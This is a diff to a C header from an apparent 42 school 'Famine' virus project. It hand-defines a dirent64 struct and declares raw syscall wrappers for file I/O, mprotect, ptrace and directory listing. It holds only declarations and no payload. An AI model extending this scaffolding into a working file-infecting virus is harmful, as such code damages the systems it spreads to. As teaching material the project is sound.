@@ -6,7 +6,7 @@
 /*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 22:36:02 by jfortin           #+#    #+#             */
-/*   Updated: 2019/06/06 04:33:03 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/06 23:27:16 by jfortin          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -20,6 +20,23 @@
 #include <dirent.h>
 #include <sys/ptrace.h>
 
+/*
+** file data
+*/
+
+struct dirent64
+{
+    __ino64_t d_ino;
+    __off64_t d_off;
+    unsigned short int d_reclen;
+    unsigned char d_type;
+    char d_name[256];                /* We must not include limits.h! */
+};
+
+/*
+** syscalls
+*/
+
 ssize_t		famine_read(int fd, void *buf, size_t count);
 ssize_t		famine_write(int fd, const void *buf, size_t count);
 int		famine_open(const char *pathname, int flags, ...);
@@ -31,7 +48,7 @@ int		famine_mprotect(void *addr, size_t len, int prot);
 int		famine_munmap(void *addr, size_t length);
 long		famine_ptrace(enum __ptrace_request request, pid_t pid, \
 				void *addr, void *data);
-int		famine_getdents64(unsigned int fd, struct dirent *dirp, \
+int		famine_getdents64(unsigned int fd, struct dirent64 *dirp, \
 				unsigned int count);
 
 #endif
